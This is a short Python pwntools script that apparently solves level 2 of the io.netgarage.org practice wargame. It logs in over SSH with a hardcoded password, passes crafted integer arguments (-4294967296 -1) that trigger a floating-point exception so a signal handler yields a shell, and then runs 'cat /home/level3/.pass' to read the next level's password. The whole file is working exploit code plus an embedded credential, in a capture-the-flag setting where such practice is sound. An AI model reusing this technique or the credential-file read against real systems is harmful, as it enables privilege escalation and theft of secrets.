from pwn import *
s = ssh(user='level2', host='io.netgarage.org', password='XNWFtWKWHhaaXoKI', port=22)
# game at http://io.netgarage.org/
sh = s.run('/levels/level02 -4294967296 -1')
# looking at the code signal(SFPE, signal_hander)
# if there is a floating point exception the code redirects
# to the signal_hander address
for i in range(3):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level3/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[8:])
s.close()
